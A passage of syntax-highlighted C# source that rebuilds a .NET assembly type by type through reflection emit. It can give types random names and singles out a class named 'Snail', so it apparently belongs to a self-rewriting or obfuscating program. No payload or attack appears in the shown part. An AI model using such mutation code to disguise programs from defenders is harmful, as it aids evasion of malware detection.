            </span><span class="sc5">catch</span><span class="sc10">(</span><span class="sc11">Exception</span><span class="sc0"> </span><span class="sc11">e</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc9">#if DEBUGCONSOLE
</span><span class="sc0">                </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc10">(</span><span class="sc6">"Failed CreateResources:error: "</span><span class="sc10">+</span><span class="sc11">e</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">());</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc2">//              Console.WriteLine();
</span><span class="sc0">            </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">            </span><span class="sc5">try</span><span class="sc0"> 
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">ab</span><span class="sc10">.</span><span class="sc11">Save</span><span class="sc10">(</span><span class="sc11">outFileName</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">catch</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ThreadAbortException</span><span class="sc0"> </span><span class="sc11">e</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Move</span><span class="sc10">(</span><span class="sc11">inFileName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">outFileName</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">catch</span><span class="sc10">(</span><span class="sc11">Exception</span><span class="sc0"> </span><span class="sc11">e</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc9">#if DEBUGCONSOLE
</span><span class="sc0">                </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc10">(</span><span class="sc6">"Failed AssemblyBuilder.Save:error: "</span><span class="sc10">+</span><span class="sc11">e</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">());</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc2">//              Console.WriteLine();
</span><span class="sc0">            </span><span class="sc10">}</span><span class="sc0">
            
            </span><span class="sc5">try</span><span class="sc0"> 
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">CopyUnmanagedResources</span><span class="sc10">(</span><span class="sc11">inFileName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">outFileName</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">catch</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ThreadAbortException</span><span class="sc0"> </span><span class="sc11">e</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">Move</span><span class="sc10">(</span><span class="sc11">inFileName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">outFileName</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">catch</span><span class="sc10">(</span><span class="sc11">Exception</span><span class="sc0"> </span><span class="sc11">e</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc9">#if DEBUGCONSOLE
</span><span class="sc0">                </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc10">(</span><span class="sc6">"Failed CopyUnmanagedResource:error: "</span><span class="sc10">+</span><span class="sc11">e</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">());</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">            </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">SetType</span><span class="sc10">(</span><span class="sc11">Type</span><span class="sc0"> </span><span class="sc11">type</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Type</span><span class="sc0"> </span><span class="sc11">wrapperType</span><span class="sc10">,</span><span class="sc0"> 
            </span><span class="sc11">ModuleBuilder</span><span class="sc0"> </span><span class="sc11">outmodb</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ModuleReader</span><span class="sc0"> </span><span class="sc11">reader</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Objects</span><span class="sc0"> </span><span class="sc11">objects</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc2">//       "+"  
</span><span class="sc0">            </span><span class="sc2">// skip types with "+" in name at top level
</span><span class="sc0">            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">tname</span><span class="sc10">=</span><span class="sc11">type</span><span class="sc10">.</span><span class="sc11">FullName</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">wrapperType</span><span class="sc10">==</span><span class="sc5">null</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">!=</span><span class="sc11">tname</span><span class="sc10">.</span><span class="sc11">IndexOf</span><span class="sc10">(</span><span class="sc6">"+"</span><span class="sc10">))</span><span class="sc0">
                </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc11">Type</span><span class="sc0"> </span><span class="sc11">extType</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">type</span><span class="sc10">.</span><span class="sc11">BaseType</span><span class="sc10">;</span><span class="sc2">// returns  System.Object
</span><span class="sc0">            </span><span class="sc11">Type</span><span class="sc0"> </span><span class="sc11">extType2</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">extType</span><span class="sc10">!=</span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc11">extType2</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">objects</span><span class="sc10">.</span><span class="sc11">TypeCompliance</span><span class="sc10">(</span><span class="sc11">extType</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">else</span><span class="sc0">
                </span><span class="sc11">extType2</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">extType2</span><span class="sc10">==</span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc11">extType2</span><span class="sc10">=</span><span class="sc11">extType</span><span class="sc10">;</span><span class="sc0"> 
            </span><span class="sc11">Type</span><span class="sc0"> </span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">interfaceTypes</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">type</span><span class="sc10">.</span><span class="sc11">GetInterfaces</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">TypeBuilder</span><span class="sc0"> </span><span class="sc11">outclassb</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">wrapperType</span><span class="sc10">!=</span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc2">//  builder 
</span><span class="sc0">                </span><span class="sc2">// find wrapper TypeBuilder
</span><span class="sc0">                </span><span class="sc11">TypeBuilder</span><span class="sc0"> </span><span class="sc11">parentTypeOut</span><span class="sc10">=</span><span class="sc11">objects</span><span class="sc10">.</span><span class="sc11">TypeCompliance</span><span class="sc10">(</span><span class="sc11">wrapperType</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">outclassb</span><span class="sc10">=</span><span class="sc11">parentTypeOut</span><span class="sc10">.</span><span class="sc11">DefineNestedType</span><span class="sc10">(</span><span class="sc0">
                    </span><span class="sc2">//type.Name,
</span><span class="sc0">                    </span><span class="sc11">EnabledRename</span><span class="sc10">(</span><span class="sc11">type</span><span class="sc10">)</span><span class="sc0">
                    </span><span class="sc10">?</span><span class="sc11">rs</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">():</span><span class="sc11">type</span><span class="sc10">.</span><span class="sc11">Name</span><span class="sc10">,</span><span class="sc0"> 
                    </span><span class="sc11">type</span><span class="sc10">.</span><span class="sc11">Attributes</span><span class="sc10">,</span><span class="sc0">
                    </span><span class="sc11">extType2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">interfaceTypes</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">else</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">newTypeName</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc5">typeof</span><span class="sc10">(</span><span class="sc11">Snail</span><span class="sc10">).</span><span class="sc11">GetHashCode</span><span class="sc10">()==</span><span class="sc11">type</span><span class="sc10">.</span><span class="sc11">GetHashCode</span><span class="sc10">())</span><span class="sc0">
                    </span><span class="sc11">newTypeName</span><span class="sc10">=</span><span class="sc11">EnabledRename</span><span class="sc10">(</span><span class="sc11">type</span><span class="sc10">)?(</span><span class="sc11">rs</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">()+</span><span class="sc6">"."</span><span class="sc10">+</span><span class="sc11">rs</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">()):</span><span class="sc11">tname</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc5">else</span><span class="sc0">
                    </span><span class="sc11">newTypeName</span><span class="sc10">=</span><span class="sc11">EnabledRename</span><span class="sc10">(</span><span class="sc11">type</span><span class="sc10">)?</span><span class="sc11">rs</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">():</span><span class="sc11">tname</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">outclassb</span><span class="sc10">=</span><span class="sc11">outmodb</span><span class="sc10">.</span><span class="sc11">DefineType</span><span class="sc10">(</span><span class="sc0">
                    </span><span class="sc2">//tname,
</span><span class="sc0">                    </span><span class="sc11">newTypeName</span><span class="sc10">,</span><span class="sc0"> 
                    </span><span class="sc11">type</span><span class="sc10">.</span><span class="sc11">Attributes</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">extType2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">interfaceTypes</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc2">//     ,      
</span><span class="sc0">            </span><span class="sc2">//       
</span><span class="sc0">
            </span><span class="sc11">objects</span><span class="sc10">.</span><span class="sc11">AddType</span><span class="sc10">(</span><span class="sc11">type</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">outclassb</span><span class="sc10">);</span><span class="sc0">
            
            </span><span class="sc11">Type</span><span class="sc0"> </span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">nestedClasses</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">type</span><span class="sc10">.</span><span class="sc11">GetNestedTypes</span><span class="sc10">(</span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">Public</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">NonPublic</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">Static</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">Instance</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">DeclaredOnly</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc5">foreach</span><span class="sc10">(</span><span class="sc11">Type</span><span class="sc0"> </span><span class="sc11">nestedClass</span><span class="sc0"> </span><span class="sc5">in</span><span class="sc0"> </span><span class="sc11">nestedClasses</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc11">SetType</span><span class="sc10">(</span><span class="sc11">nestedClass</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">type</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">outmodb</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">reader</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">objects</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc11">MethodBase</span><span class="sc0"> </span><span class="sc11">goBase</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">DefParams</span><span class="sc10">(</span><span class="sc11">MethodBase</span><span class="sc0"> </span><span class="sc11">methodBase</span><span class="sc10">,</span><span class="sc0"> 
            </span><span class="sc5">ref</span><span class="sc0"> </span><span class="sc11">MethodBuilder</span><span class="sc0"> </span><span class="sc11">methodBuilder</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">ParameterInfo</span><span class="sc0"> </span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">inp</span><span class="sc10">=</span><span class="sc11">methodBase</span><span class="sc10">.</span><span class="sc11">GetParameters</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">inp</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">ParameterBuilder</span><span class="sc0"> </span><span class="sc11">pout</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">methodBuilder</span><span class="sc10">.</span><span class="sc11">DefineParameter</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> 
                    </span><span class="sc11">inp</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">Attributes</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">inp</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">Name</span><span class="sc10">);</span><span class="sc0">
                
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">DefCtorParams</span><span class="sc10">(</span><span class="sc11">MethodBase</span><span class="sc0"> </span><span class="sc11">methodBase</span><span class="sc10">,</span><span class="sc0"> 
            </span><span class="sc5">ref</span><span class="sc0"> </span><span class="sc11">ConstructorBuilder</span><span class="sc0"> </span><span class="sc11">ctorBuilder</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">ParameterInfo</span><span class="sc0"> </span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">inp</span><span class="sc10">=</span><span class="sc11">methodBase</span><span class="sc10">.</span><span class="sc11">GetParameters</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">inp</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">ParameterBuilder</span><span class="sc0"> </span><span class="sc11">pout</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ctorBuilder</span><span class="sc10">.</span><span class="sc11">DefineParameter</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> 
                    </span><span class="sc11">inp</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">Attributes</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">inp</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">Name</span><span class="sc10">);</span><span class="sc0">
                
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">


    
        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">EmitType</span><span class="sc10">(</span><span class="sc11">Type</span><span class="sc0"> </span><span class="sc11">type</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Type</span><span class="sc0"> </span><span class="sc11">wrapperType</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ModuleReader</span><span class="sc0"> </span><span class="sc11">reader</span><span class="sc10">,</span><span class="sc0"> 
            </span><span class="sc11">Assembly</span><span class="sc0"> </span><span class="sc11">asm</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">ref</span><span class="sc0"> </span><span class="sc11">AssemblyBuilder</span><span class="sc0"> </span><span class="sc11">ab</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">bool</span><span class="sc0"> </span><span class="sc11">setEP</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">PEFileKinds</span><span class="sc0"> </span><span class="sc11">filetype</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Objects</span><span class="sc0"> </span><span class="sc11">objects</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc2">//       "+"  
</span><span class="sc0">            </span><span class="sc2">// skip type with "+" in name at top level
</span><span class="sc0">            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">tname</span><span class="sc10">=</span><span class="sc11">type</span><span class="sc10">.</span><span class="sc11">FullName</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">wrapperType</span><span class="sc10">==</span><span class="sc5">null</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">!=</span><span class="sc11">tname</span><span class="sc10">.</span><span class="sc11">IndexOf</span><span class="sc10">(</span><span class="sc6">"+"</span><span class="sc10">))</span><span class="sc0">
                </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc9">#if DEBUGCONSOLE
</span><span class="sc0">            </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc6">"emitting:"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">type</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">());</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">
            </span><span class="sc2">//         
</span><span class="sc0">            </span><span class="sc11">ConstructorInfo</span><span class="sc0"> </span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">ctors</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">type</span><span class="sc10">.</span><span class="sc11">GetConstructors</span><span class="sc10">(</span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">Public</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> 
                </span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">NonPublic</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">Static</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">Instance</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0">
                </span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">DeclaredOnly</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">foreach</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ConstructorInfo</span><span class="sc0"> </span><span class="sc11">ctorInfo</span><span class="sc0"> </span><span class="sc5">in</span><span class="sc0"> </span><span class="sc11">ctors</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc9">#if DEBUGCONSOLE
</span><span class="sc0">                </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc10">(</span><span class="sc6">"------------------------------------------------"</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc10">(</span><span class="sc11">ctorInfo</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">                </span><span class="sc11">ConstructorBuilder</span><span class="sc0"> </span><span class="sc11">outctor</span><span class="sc10">=</span><span class="sc11">objects</span><span class="sc10">.</span><span class="sc11">ConstructorCompliance</span><span class="sc10">(</span><span class="sc11">type</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ctorInfo</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">outctor</span><span class="sc10">==</span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">
                    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">MethodBody</span><span class="sc0"> </span><span class="sc11">ctorBody</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">reader</span><span class="sc10">.</span><span class="sc11">GetMethodBody</span><span class="sc10">(</span><span class="sc11">ctorInfo</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ctorBody</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc9">#if DEBUGCONSOLE
</span><span class="sc0">                    </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc10">(</span><span class="sc6">"ctor "</span><span class="sc10">+</span><span class="sc11">ctorInfo</span><span class="sc10">.</span><span class="sc11">DeclaringType</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">()+</span><span class="sc6">"(EMPTY)"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc5">else</span><span class="sc0"> 
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">ILGenerator</span><span class="sc0"> </span><span class="sc11">il</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">outctor</span><span class="sc10">.</span><span class="sc11">GetILGenerator</span><span class="sc10">();</span><span class="sc0">
                    </span><span class="sc11">CreateMethodBody</span><span class="sc10">(</span><span class="sc11">type</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ctorInfo</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ctorBody</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">ref</span><span class="sc0"> </span><span class="sc11">il</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">shorts</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">objects</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">MethodBase</span><span class="sc0"> </span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">methods</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">type</span><span class="sc10">.</span><span class="sc11">GetMethods</span><span class="sc10">(</span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">Public</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> 
                </span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">NonPublic</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">Static</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> 
                </span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">Instance</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">BindingFlags</span><span class="sc10">.</span><span class="sc11">DeclaredOnly</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">foreach</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">MethodBase</span><span class="sc0"> </span><span class="sc11">methodBase</span><span class="sc0"> </span><span class="sc5">in</span><span class="sc0"> </span><span class="sc11">methods</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc9">#if DEBUGCONSOLE
</span><span class="sc0">                </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc10">(</span><span class="sc6">"------------------------------------------------"</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc10">(</span><span class="sc11">methodBase</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">methodBase</span><span class="sc10">.</span><span class="sc11">Name</span><span class="sc10">==</span><span class="sc6">"Main"</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">methodBase</span><span class="sc10">.</span><span class="sc11">DeclaringType</span><span class="sc10">==</span><span class="sc5">typeof</span><span class="sc10">(</span><span class="sc11">Snail</span><span class="sc10">))</span><span class="sc0">
                    </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">MethodBuilder</span><span class="sc0"> </span><span class="sc11">outmb</span><span class="sc10">=</span><span class="sc11">objects</span><span class="sc10">.</span><span class="sc11">MethodCompliance</span><span class="sc10">(</span><span class="sc11">type</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">methodBase</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">MethodBody</span><span class="sc0"> </span><span class="sc11">methodBody</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">reader</span><span class="sc10">.</span><span class="sc11">GetMethodBody</span><span class="sc10">(</span><span class="sc11">methodBase</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">methodBody</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc9">#if DEBUGCONSOLE
</span><span class="sc0">                    </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc10">(</span><span class="sc6">"method "</span><span class="sc10">+</span><span class="sc11">methodBase</span><span class="sc10">.</span><span class="sc11">DeclaringType</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">()+</span><span class="sc0">
                        </span><span class="sc6">" "</span><span class="sc10">+</span><span class="sc11">methodBase</span><span class="sc10">.</span><span class="sc11">Name</span><span class="sc10">+</span><span class="sc6">"(EMPTY)"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc5">else</span><span class="sc0"> 
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">ILGenerator</span><span class="sc0"> </span><span class="sc11">il</span><span class="sc10">=</span><span class="sc11">outmb</span><span class="sc10">.</span><span class="sc11">GetILGenerator</span><span class="sc10">();</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">asm</span><span class="sc10">.</span><span class="sc11">EntryPoint</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">methodBase</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">setEP</span><span class="sc10">)</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc11">CreateMethodBody</span><span class="sc10">(</span><span class="sc11">type</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">methodBase</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">methodBody</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">ref</span><span class="sc0"> </span><span class="sc11">il</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">shorts</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">objects</span><span class="sc10">);</span><span class="sc0">
